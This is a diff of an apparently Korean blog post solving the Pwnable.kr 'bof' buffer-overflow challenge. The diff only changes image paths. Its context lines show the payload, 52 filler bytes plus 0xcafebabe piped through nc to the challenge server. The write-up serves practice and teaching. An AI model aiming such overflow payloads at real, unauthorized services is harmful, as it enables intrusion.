@@ -3,7 +3,7 @@ title: '[Pwnable.kr] bof'
 date: '2017-08-30'
 ---
 
-![]({{ site.baseurl }}/assets/posts/pwnkr/bof.png)
+![](/assets/posts/pwnkr/bof.png)
 
 이름만 봐도 알 수 있는 buffer overflow 문제!
 코드는 다음과 같다.
@@ -88,7 +88,7 @@ End of assembler dump.
 즉, 52바이트 만큼 다른 문자를 채워넣고 0xcafebabe 를 넣어 주면 된다.
 
 `(python -c 'print "A"*52+"\xbe\xba\xfe\xca"'; cat) |nc pwnable.kr 9000` 를 해주면
-![]({{ site.baseurl }}/assets/posts/pwnkr/bof_flag.png)
+![](/assets/posts/pwnkr/bof_flag.png)
 
 flag가 뜬다!
 
